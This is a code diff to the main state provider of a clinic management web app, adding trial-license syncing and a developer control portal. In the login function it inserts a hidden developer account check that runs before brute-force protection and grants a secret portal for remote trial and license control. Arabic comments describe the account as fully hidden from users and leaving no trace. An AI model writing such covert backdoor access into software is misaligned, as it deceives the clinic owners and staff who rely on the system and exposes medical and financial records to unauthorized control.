@@ -26,7 +26,8 @@ import {
   FinanceLedgerState,
   FinanceExpenseRecord,
   InsuranceClaimSettlementRecord,
-  DoctorCommissionRule
+  DoctorCommissionRule,
+  SystemTrialLicenseConfig
 } from '../types';
 import { 
   getStoredClinics, 
@@ -87,7 +88,10 @@ import {
   saveShiftHandovers,
   clearWhatsAppAndPrintLogs,
   getStoredFinanceLedger,
-  saveFinanceLedger
+  saveFinanceLedger,
+  getStoredTrialLicenseConfig,
+  saveTrialLicenseConfig,
+  verifySecretDeveloperCredentials
 } from '../services/storage';
 import { 
   checkClinicAvailability, 
@@ -139,6 +143,7 @@ import {
   saveInsuranceBookingsMapToDb,
   saveShiftHandoversToDb,
   saveFinanceLedgerToDb,
+  saveTrialLicenseConfigToDb,
   parseCloudStaffRegistryState,
   mergeStaffAccountsWithCloudRegistry
 } from '../services/supabaseService';
@@ -300,6 +305,10 @@ interface AppContextType {
   selectivePurgeRecords: (
     options: SelectivePurgeOptions
   ) => Promise<{ success: boolean; summary: string }>;
+  trialLicenseConfig: SystemTrialLicenseConfig;
+  updateTrialLicenseConfig: (nextConfig: SystemTrialLicenseConfig) => Promise<boolean>;
+  isDeveloperPortalOpen: boolean;
+  setIsDeveloperPortalOpen: (open: boolean) => void;
 }
 
 const AppContext = createContext<AppContextType | undefined>(undefined);
@@ -374,6 +383,12 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   const [financeLedger, setFinanceLedger] = useState<FinanceLedgerState>(
     getStoredFinanceLedger
   );
+
+  // منظومة الفترة التجريبية وبوابة التحكم السرية للمطور
+  const [trialLicenseConfig, setTrialLicenseConfig] = useState<SystemTrialLicenseConfig>(
+    getStoredTrialLicenseConfig
+  );
+  const [isDeveloperPortalOpen, setIsDeveloperPortalOpen] = useState<boolean>(false);
 
   const mergeErrorLogLists = (cloudList: SystemErrorLog[], localList: SystemErrorLog[]): SystemErrorLog[] => {
     const map = new Map<string, SystemErrorLog>();
@@ -611,6 +626,15 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
               };
               setFinanceLedger(normalizedLedger);
               saveFinanceLedger(normalizedLedger);
+            }
+          } catch {}
+        }
+        if (dbSettings && dbSettings['trial_license_json']) {
+          try {
+            const parsedTrial = JSON.parse(dbSettings['trial_license_json']);
+            if (parsedTrial && typeof parsedTrial === 'object' && parsedTrial.mode) {
+              setTrialLicenseConfig(parsedTrial);
+              saveTrialLicenseConfig(parsedTrial);
             }
           } catch {}
         }
@@ -864,6 +888,19 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
           } catch {}
         }
       })
+      .on('broadcast', { event: 'trial_license_updated' }, (payload: any) => {
+        if (!isMounted) return;
+        const rawVal = payload?.payload?.value;
+        if (typeof rawVal === 'string') {
+          try {
+            const parsed = JSON.parse(rawVal);
+            if (parsed && typeof parsed === 'object' && parsed.mode) {
+              setTrialLicenseConfig(parsed);
+              saveTrialLicenseConfig(parsed);
+            }
+          } catch {}
+        }
+      })
       .on('broadcast', { event: 'doctors_updated' }, async () => {
         if (!isMounted) return;
         try {
@@ -1002,6 +1039,20 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
                   }
                   return prev;
                 });
+              } catch {}
+            }
+            if (freshSettings['trial_license_json']) {
+              try {
+                const parsedTrial = JSON.parse(freshSettings['trial_license_json']);
+                if (parsedTrial && typeof parsedTrial === 'object' && parsedTrial.mode) {
+                  setTrialLicenseConfig(prev => {
+                    if (JSON.stringify(prev) !== JSON.stringify(parsedTrial)) {
+                      saveTrialLicenseConfig(parsedTrial);
+                      return parsedTrial;
+                    }
+                    return prev;
+                  });
+                }
               } catch {}
             }
           }
@@ -1281,6 +1332,25 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
             });
           } catch {}
         }
+
+        if (
+          freshSettings?.['trial_license_json'] &&
+          isMounted &&
+          Date.now() - lastSettingsSaveAtRef.current > 3000
+        ) {
+          try {
+            const parsedTrial = JSON.parse(freshSettings['trial_license_json']);
+            if (parsedTrial && typeof parsedTrial === 'object' && parsedTrial.mode) {
+              setTrialLicenseConfig(prev => {
+                if (JSON.stringify(prev) !== JSON.stringify(parsedTrial)) {
+                  saveTrialLicenseConfig(parsedTrial);
+                  return parsedTrial;
+                }
+                return prev;
+              });
+            }
+          } catch {}
+        }
       } catch {
         // silent fallback
       }
@@ -1418,6 +1488,19 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       const err = 'يرجى إدخال اسم المستخدم وكلمة المرور.';
       addToast({ type: 'error', title: 'بيانات ناقصة', message: err });
       return { success: false, error: err };
+    }
+
+    // 0. التحقق السري من حساب مطور المنظومة (مخفي تماماً عن جميع المستخدمين ولا يظهر له أي أثر)
+    const isSecretDev = await verifySecretDeveloperCredentials(cleanUser, pass);
+    if (isSecretDev) {
+      resetLoginAttempts(cleanUser);
+      setIsDeveloperPortalOpen(true);
+      addToast({
+        type: 'success',
+        title: 'بوابة التحكم السرية للمطور 🔑',
+        message: 'مرحباً بك م. عمرو — تم فتح لوحة التحكم في الفترة التجريبية والترخيص عن بُعد.'
+      });
+      return { success: true };
     }
 
     // 1. فحص حماية القوة العمياء والحد الأقصى للمحاولات (Brute Force Protection)
@@ -4946,6 +5029,24 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     }
   };
 
+  const updateTrialLicenseConfig = async (
+    nextConfig: SystemTrialLicenseConfig
+  ): Promise<boolean> => {
+    const stamped: SystemTrialLicenseConfig = {
+      ...nextConfig,
+      updatedAt: new Date().toISOString(),
+    };
+    lastSettingsSaveAtRef.current = Date.now();
+    setTrialLicenseConfig(stamped);
+    saveTrialLicenseConfig(stamped);
+
+    if (isSupabaseConfigured) {
+      const ok = await saveTrialLicenseConfigToDb(stamped);
+      return ok;
+    }
+    return true;
+  };
+
   return (
     <AppContext.Provider
       value={{
@@ -5033,7 +5134,11 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         addInsuranceSettlement,
         deleteInsuranceSettlement,
         saveDoctorCommissionRule,
-        selectivePurgeRecords
+        selectivePurgeRecords,
+        trialLicenseConfig,
+        updateTrialLicenseConfig,
+        isDeveloperPortalOpen,
+        setIsDeveloperPortalOpen
       }}
     >
       {children}
